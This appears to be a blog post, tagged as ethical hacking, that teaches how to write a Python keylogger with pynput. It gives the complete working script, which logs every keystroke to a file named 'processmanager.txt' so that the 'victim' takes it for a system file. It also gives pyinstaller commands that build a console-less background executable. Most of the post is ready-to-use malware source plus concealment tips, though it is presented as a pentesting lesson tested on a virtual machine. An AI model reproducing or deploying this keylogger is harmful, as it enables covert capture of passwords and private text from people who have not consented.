---
title: Writing a keylogger using python
date: 2020-12-24 11:09:11 GMT+2
categories: [Development, Pentesting Tools]
tags: [ethical hacking, python]     # TAG names should always be lowercase
image: /assets/img/posts/keylogger/keylogger.png
---

## What is keylogger ?
Keylogger is a type of monitoring software designed to record keystrokes made by a user. This keylogger records the information you type into a website or application and send to back to a third party whether that is a criminal, law enforcement or IT department.

## Writing the script
### Step 1: Importing required modules

* os: The OS module in python provides functions for interacting with the operating system. OS, comes under Python's standard utility modules. This module provides a portable way of using operating system dependent functionality. The *os* and *os. path* modules include many functions to interact with the file system.
* pynput: This library allows us to control and monitor input devices (such as keyboard and mouse). Therefore, we use this library to automate the process of capturing keystrokes.

```python
#Python code snippet
import os
from pynput.keyboard import Listener
```

### Step 2: Setting the listener
We set the listener to capture the keystrokes then we send each key individually to the write_file function that we will implement later to save the keystrokes logs at a file.

```python
#Python code snippet
try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt:
    exit(0)
```

### Step 3: Implement write_file() function
We define a path variable that where the keystrokes logs file will be hidden whether the operating system is windows or linux. In case of windows OS, we hide the file at "C:\Users\Username\AppData\Roaming\processmanager.txt". While in case of linux, we hide the file at "/root/processmanager.txt". Notice that we name the file "processmanager.txt" so the victim may be tricked and thinks it is an operating system file and accordingly will not open or delete it.  
Then, we implement write_file() function that takes each key individually as a parameter then open the specified file and save each key inside that file. Also, we handle some of special keys (such as backspace, space, ...) so that ease for us the reading of file when the victim presses on anyone of that keys.


```python
#Python code snippet
path = os.environ['appdata'] +'\\processmanager.txt'       # For Windows
#path = '/root/processmanager.txt'                                 # For Linux

def write_file(key):
    with open(path, 'a') as f:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('ctrl') > 0:
                f.write(' Ctrl ')
            elif k.find('Key'):
                f.write(k)
```
## The complete script
After assembling all the steps together, here is the final script.

```python
import os
from pynput.keyboard import Listener

path = os.environ['appdata'] +'\\processmanager.txt'       # For Windows
#path = '/root/processmanager.txt'                                 # For Linux

def write_file(key):
    with open(path, 'a') as f:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('ctrl') > 0:
                f.write(' Ctrl ')
            elif k.find('Key'):
                f.write(k)

try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt as e:
    print(e)
```

## Script output
We test our script on windows 10 virtual machine. First, we transfere the python file from kali linux machine to windows 10 machine using any method you prefere (such as web server, usb, ...) then we compile the python file to exe using pyinstaller. After that, we run keylogger.exe on the background and start typing, and as expected we found the "processmanager.txt" file at the specified path "C:\Users\Username\AppData\Roaming\processmanager.txt" and all the keystrokes are saved at that file. When we finished, we terminate keylogger program from task manager by select it and click on end task.

```bash
pip3 install pyinstaller				# Install pyinstaller
pyinstaller keylogger.py --onefile --noconsole		# Compile python file to exe
```

![script_output](/assets/img/posts/keylogger/script_output.png)
